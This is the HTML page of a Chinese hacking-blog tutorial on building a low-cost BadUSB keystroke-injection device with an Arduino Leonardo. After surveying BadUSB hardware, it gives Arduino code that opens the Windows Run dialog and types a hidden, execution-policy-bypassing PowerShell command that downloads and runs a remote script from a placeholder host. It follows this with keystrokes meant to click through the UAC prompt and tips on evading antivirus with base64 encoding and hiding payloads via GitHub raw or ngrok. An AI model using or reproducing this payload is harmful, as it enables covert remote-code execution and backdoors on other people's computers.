@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/Terminal_180x180.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Terminal_32x32.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Terminal_16x16.png?v=6.4.2">
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.4.2',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="引言鉴于硬件安全对于大多数新人是较少接触的，而这方面又非常吸引我，但是部分专业安全研究设备较高的价格使人望而却步。在该系列中，笔者希望对此感兴趣的读者在花费较少金钱的情况下体会到硬件安全的魅力所在。本系列计划分成四个部分：BadUSB on Arduino; RFID on PN532; GSM on Motorola C118 ; SDR on RTL2832U(电视棒)。 背景BadUSB早在">
+<meta name="keywords" content="硬件安全,BadUSB,Arduino">
+<meta property="og:type" content="article">
+<meta property="og:title" content="低成本安全硬件（一）——BadUSB on Arduino">
+<meta property="og:url" content="https://nonconformist.me/lowcost-badUSB/index.html">
+<meta property="og:site_name" content="ya0guang打哈欠的地方">
+<meta property="og:description" content="引言鉴于硬件安全对于大多数新人是较少接触的，而这方面又非常吸引我，但是部分专业安全研究设备较高的价格使人望而却步。在该系列中，笔者希望对此感兴趣的读者在花费较少金钱的情况下体会到硬件安全的魅力所在。本系列计划分成四个部分：BadUSB on Arduino; RFID on PN532; GSM on Motorola C118 ; SDR on RTL2832U(电视棒)。 背景BadUSB早在">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://nonconformist.me/lowcost-badUSB/rubber_ducky.jpg">
+<meta property="og:image" content="https://nonconformist.me/lowcost-badUSB/teensy.PNG">
+<meta property="og:image" content="https://nonconformist.me/lowcost-badUSB/my_device.jpg">
+<meta property="og:image" content="https://nonconformist.me/lowcost-badUSB/arduino_ide_setting.png">
+<meta property="og:updated_time" content="2017-02-22T11:54:54.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="低成本安全硬件（一）——BadUSB on Arduino">
+<meta name="twitter:description" content="引言鉴于硬件安全对于大多数新人是较少接触的，而这方面又非常吸引我，但是部分专业安全研究设备较高的价格使人望而却步。在该系列中，笔者希望对此感兴趣的读者在花费较少金钱的情况下体会到硬件安全的魅力所在。本系列计划分成四个部分：BadUSB on Arduino; RFID on PN532; GSM on Motorola C118 ; SDR on RTL2832U(电视棒)。 背景BadUSB早在">
+<meta name="twitter:image" content="https://nonconformist.me/lowcost-badUSB/rubber_ducky.jpg">
+
+
+
+
+
+
+  <link rel="canonical" href="https://nonconformist.me/lowcost-badUSB/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>低成本安全硬件（一）——BadUSB on Arduino | ya0guang打哈欠的地方</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ya0guang打哈欠的地方</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <h1 class="site-subtitle" itemprop="description">/Hacker/Photographer/Geek/</h1>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-硬件安全" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://nonconformist.me/lowcost-badUSB/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ya0guang">
+      <meta itemprop="description" content="家里蹲青年也不要成为咸鱼">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ya0guang打哈欠的地方">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">低成本安全硬件（一）——BadUSB on Arduino
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2017-02-21 20:04:01" itemprop="dateCreated datePublished" datetime="2017-02-21T20:04:01+08:00">2017-02-21</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2017-02-22 19:54:54" itemprop="dateModified" datetime="2017-02-22T19:54:54+08:00">2017-02-22</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>鉴于硬件安全对于大多数新人是较少接触的，而这方面又非常吸引我，但是部分专业安全研究设备较高的价格使人望而却步。在该系列中，笔者希望对此感兴趣的读者在花费较少金钱的情况下体会到硬件安全的魅力所在。本系列计划分成四个部分：BadUSB on Arduino; RFID on PN532; GSM on Motorola C118 ; SDR on RTL2832U(电视棒)。</p>
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>BadUSB早在2014年底的PacSec会议上便已经提出，这是USB协议中的一个漏洞————USB设备可以伪装成为其他任何设备，例如输入设备、网卡等等。这个漏洞目前还没有得到修复，几乎可以说在有合适的脚本的情况下，只要能够插进去，没有什么是黑不掉的！</p>
+<h3 id="2014年的PPT参考如下："><a href="#2014年的PPT参考如下：" class="headerlink" title="2014年的PPT参考如下："></a>2014年的PPT参考如下：</h3><p><a href="https://srlabs.de/wp-content/uploads/2014/11/SRLabs-BadUSB-Pacsec-v2.pdf" target="_blank" rel="noopener">https://srlabs.de/wp-content/uploads/2014/11/SRLabs-BadUSB-Pacsec-v2.pdf</a></p>
+<h1 id="常见硬件介绍"><a href="#常见硬件介绍" class="headerlink" title="常见硬件介绍"></a>常见硬件介绍</h1><h2 id="Psychson"><a href="#Psychson" class="headerlink" title="Psychson"></a>Psychson</h2><p>事实上这是Github上的一个开源项目，由于世面上的部分U盘的芯片可以Hack，所以通过比较Geek的方式可以让U盘实现BadUSB的功能。但是项目已经两年没有更新过了，支持的许多硬件也已经停产或者更换了新的主控芯片，笔者也尝试着使用之但是失败了。</p>
+<p>伪装性：★★★★★</p>
+<p>易开发：★★</p>
+<p>社区支持：★★</p>
+<h3 id="项目主页："><a href="#项目主页：" class="headerlink" title="项目主页："></a>项目主页：</h3><p><a href="https://github.com/brandonlw/Psychson" target="_blank" rel="noopener">https://github.com/brandonlw/Psychson</a></p>
+<h2 id="Rubber-Ducky"><a href="#Rubber-Ducky" class="headerlink" title="Rubber Ducky"></a>Rubber Ducky</h2><img src="/lowcost-badUSB/rubber_ducky.jpg" title="[Rubber Ducky 结构图]">
+<p>中文名橡皮鸭，外观酷（就）似（是）普通的U盘，但是却藏着一颗蔫坏的芯。其结构如图，特点在于可以拆卸并且使用SD卡，可以随时更换Payload，而且十分容易伪装！以至于美剧 《Mr. Robot》里的主角用该设备成功引起了警察的注意（并黑掉了他。但是Hak5上的Rubber Ducky 需要45美刀，这无疑是笔者承受不起的！况且其配送地区还Ban了中国！不过其项目中的脚本还是很值得我们去参考学习的！</p>
+<p>伪装性：★★★★</p>
+<p>易开发：★★★☆</p>
+<p>社区支持：★★★★</p>
+<h3 id="Hak5链接："><a href="#Hak5链接：" class="headerlink" title="Hak5链接："></a>Hak5链接：</h3><p><a href="https://hakshop.com/products/usb-rubber-ducky-deluxe" target="_blank" rel="noopener">https://hakshop.com/products/usb-rubber-ducky-deluxe</a></p>
+<h3 id="官方Payloads"><a href="#官方Payloads" class="headerlink" title="官方Payloads"></a>官方Payloads</h3><p><a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads" target="_blank" rel="noopener">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads</a></p>
+<h2 id="Teensy-USB"><a href="#Teensy-USB" class="headerlink" title="Teensy USB"></a>Teensy USB</h2><img src="/lowcost-badUSB/teensy.PNG" title="[Teensy USB]">
+<p>一款USB微控制器开发板，想必便可以当作键盘鼠标来用啦！可以看到部分款式也有插存储卡的地方，价格总体上也达到了Rubber Ducky的一半，但是美刀对于我们而言还是略贵的！</p>
+<p>伪装性：★★</p>
+<p>易开发：★★★</p>
+<p>社区支持：★★★</p>
+<h1 id="Arduino-Leonardo"><a href="#Arduino-Leonardo" class="headerlink" title="Arduino Leonardo"></a>Arduino Leonardo</h1><p>这才是我们今天的主角，其以20-40RMB的售价成为了穷黑客的（我）的首选！而且Arduino的编程对初学者也相当的友好。 笔者的芯片如图：<br><img src="/lowcost-badUSB/my_device.jpg" title="[我的Arduino Leonardo]"></p>
+<p>首先，我们需要对Arduino进行设置，更改“串口”和“开发板”选项：<br><img src="/lowcost-badUSB/arduino_ide_setting.png" title="[Arduino IDE settings]"></p>
+<p>下面开始编写Payload。事实上Payload就是通过键盘来执行一系列的指令来达到某些目的，比如植入后门，反弹shell等。我们需要以此为思路进行程序的编写。</p>
+<h2 id="启动方式"><a href="#启动方式" class="headerlink" title="启动方式"></a>启动方式</h2><p>程序的大致结构如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Keyboard.h&gt;</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line">  //Payload</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">  //none</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用到了一个Keyboard库定义了按键，键盘上一些无法输入的按键需要查看定义的名称，其库文件在github上也可以看到：<br><a href="https://github.com/arduino-libraries/Keyboard/blob/master/src/Keyboard.h" target="_blank" rel="noopener">https://github.com/arduino-libraries/Keyboard/blob/master/src/Keyboard.h</a></p>
+<p>其中对我们有用的只有setup，即板子上电，也就是插入的瞬间便开始执行的部分，loop部分留空。</p>
+<p>笔者本人用的windos系统，这里仅讨论windos。若要在windows下仅仅通过键盘执行一段脚本或程序，最经典的方式就是Ctrl+R了。在windos8及以上的操作系统中Win键+S之后，输入powershell或cmd，之后再按回车也可以开始写命令。</p>
+<p>代码如下，蛋疼的地方在于中文的输入法可以很大程度上避免被BadUSB攻击，但是我们在脚本中也可以利用默认的一些快捷键切换到英文输入法。再加上Windows系统不区分大小写，从某些程度上讲只用到大写锁定键足矣。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">delay(1000);</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.press(&apos;r&apos;);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">delay(500);</span><br><span class="line"></span><br><span class="line">//针对shift+ctrl切换输入法</span><br><span class="line">Keyboard.press(KEY_LEFT_SHIFT);</span><br><span class="line">Keyboard.press(KEY_LEFT_CTRL);</span><br><span class="line"></span><br><span class="line">//针对win8及以上部分操作系统改换中文输入</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.println(&apos; &apos;);</span><br><span class="line"></span><br><span class="line">//某些输入法的中英文切换</span><br><span class="line">Keyboard.press(KEY_LEFT_SHIFT);</span><br><span class="line"></span><br><span class="line">//暴力直接切换成英文</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK)</span><br><span class="line"></span><br><span class="line">//手动释放按键</span><br><span class="line">Keyboard.releaseAll();</span><br></pre></td></tr></table></figure></p>
+<h2 id="powershell的各种姿势"><a href="#powershell的各种姿势" class="headerlink" title="powershell的各种姿势"></a>powershell的各种姿势</h2><p>既然“运行”对话框已经打开，下一步需要做的便是执行代码了。在这里我们需要用到一些powershell启动的高级姿势。</p>
+<h3 id="启动选项"><a href="#启动选项" class="headerlink" title="启动选项"></a>启动选项</h3><p>在cmd或者powershell中输入”powershell -?”便可以得到所有的启动选项，这里我们主要关注其中的两个：ExecutionPolicy和WindowStyle。由于powershell的默认ExecutionPolicy是RemoteSigned。即下载脚本必须可信，换句话说就是用户脚本不能执行。所以我们需要设置该字段为Unrestricted或者Bypass。而WindowStyle设置为Hidden时可以隐藏窗口执行，这对隐蔽性很有帮助。</p>
+<p>例如，我们可以在运行中输入：<br><figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -executionpolicy bypass -windowstyle hidden ping www.baidu.com  &gt; d:\test.txt</span><br></pre></td></tr></table></figure></p>
+<p>可以看到test.txt内容如下：<br><blockquote><p>正在 Ping <a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a> [119.75.218.70] 具有 32 字节的数据:<br>来自 119.75.218.70 的回复: 字节=32 时间=23ms TTL=53<br>来自 119.75.218.70 的回复: 字节=32 时间=23ms TTL=53<br>来自 119.75.218.70 的回复: 字节=32 时间=24ms TTL=53<br>来自 119.75.218.70 的回复: 字节=32 时间=23ms TTL=53</p>
+<p>119.75.218.70 的 Ping 统计信息:<br>    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，<br>往返行程的估计时间(以毫秒为单位):<br>    最短 = 23ms，最长 = 24ms，平均 = 23ms</p>
+<footer><strong>[test.txt]</strong></footer></blockquote></p>
+<p>除此之外，还可以直接从base64编码执行，这样可以直接bypass antivirus software。这是一种更为强大的运行姿势。</p>
+<h3 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h3><p>事实上，bypass的目的真正是为了执行来自远程服务器的脚本。这里有一个用法：<br><figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://your.site/file.ps1'</span>);</span><br></pre></td></tr></table></figure><br>这里牵扯到了powershell的强大之处，其可以直接创建对象。上面的意思是从下载一个远程脚本并执行。显然远程脚本相对于把payload写在一行更加优雅，而且更加灵活。最重要的原因还是此arduino开发板的存储空间太小，并不能容纳太长的脚本。</p>
+<p>这里推荐一个powershell的渗透框架：nishang</p>
+<p>项目地址：<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p>
+<p>nishang的强大之处在于其几乎可以实现一个后门可以实现的所有。</p>
+<p>据笔者了解，metasploit也支持生产powershell的payload了。</p>
+<p>公网上的powershell脚本可以通过github的raw浏览服务、一些在线的文本存储服务，甚至是用ngrok做一个web服务器的映射来完成临时、隐蔽的发送。</p>
+<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><p>后续的代码如下,其中后面的部分是为了处理UAC，即一个弹出用户确认的对话框。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Keyboard.println(&quot;powershell -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString(&apos;http://your.site/file.ps1&apos;);&quot;);</span><br><span class="line">Keyboard.press(KEY_LEFT_CTRL);</span><br><span class="line">Keyboard.press(KEY_LEFT_SHIFT);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">delay(500);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">delay(2500);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line"></span><br><span class="line">Keyboard.press(KEY_LEFT_ALT);</span><br><span class="line">Keyboard.println(&apos;y&apos;);  </span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">delay(1500)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>Powershell与BadUSB的结合可以在Windows下办到很多事情，BadUSB的渗透方案也不仅仅限于键盘输入，鼠标输入甚至网卡都是可以作为攻击工具。笔者在Kali Nethunter上就见到了将手机作为网卡来嗅探流量的用法。虽然距离漏洞正式发布已经过去了整整两年时间，但是这一漏洞短时间内还将普遍存在于各大操作系统以及USB协议中，更高级的姿势还需要自己去探索！</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>早餐加俩蛋</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ya0guang WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ya0guang Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/硬件安全/" rel="tag"># 硬件安全</a>
+          
+            <a href="/tags/BadUSB/" rel="tag"># BadUSB</a>
+          
+            <a href="/tags/Arduino/" rel="tag"># Arduino</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/nethunter-8021x/" rel="next" title="使用Kali Nethunter破解802.1x安全性WiFi">
+                <i class="fa fa-chevron-left"></i> 使用Kali Nethunter破解802.1x安全性WiFi
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/my-booklist/" rel="prev" title="我的安全学习书单（持续更新）">
+                我的安全学习书单（持续更新） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="ya0guang">
+            
+              <p class="site-author-name" itemprop="name">ya0guang</p>
+              <p class="site-description motion-element" itemprop="description">家里蹲青年也不要成为咸鱼</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">Tags</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#引言"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#背景"><span class="nav-number">2.</span> <span class="nav-text">背景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2014年的PPT参考如下："><span class="nav-number">2.0.1.</span> <span class="nav-text">2014年的PPT参考如下：</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#常见硬件介绍"><span class="nav-number">3.</span> <span class="nav-text">常见硬件介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Psychson"><span class="nav-number">3.1.</span> <span class="nav-text">Psychson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#项目主页："><span class="nav-number">3.1.1.</span> <span class="nav-text">项目主页：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rubber-Ducky"><span class="nav-number">3.2.</span> <span class="nav-text">Rubber Ducky</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hak5链接："><span class="nav-number">3.2.1.</span> <span class="nav-text">Hak5链接：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#官方Payloads"><span class="nav-number">3.2.2.</span> <span class="nav-text">官方Payloads</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Teensy-USB"><span class="nav-number">3.3.</span> <span class="nav-text">Teensy USB</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Arduino-Leonardo"><span class="nav-number">4.</span> <span class="nav-text">Arduino Leonardo</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#启动方式"><span class="nav-number">4.1.</span> <span class="nav-text">启动方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#powershell的各种姿势"><span class="nav-number">4.2.</span> <span class="nav-text">powershell的各种姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#启动选项"><span class="nav-number">4.2.1.</span> <span class="nav-text">启动选项</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程执行"><span class="nav-number">4.2.2.</span> <span class="nav-text">远程执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-UAC"><span class="nav-number">4.2.3.</span> <span class="nav-text">Bypass UAC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结语"><span class="nav-number">5.</span> <span class="nav-text">结语</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ya0guang</span>
+
+  
+
+  
+</div>
+
+
+  
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" rel="external nofollow" href="https://theme-next.org">NexT.Pisces</a> v6.4.2</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
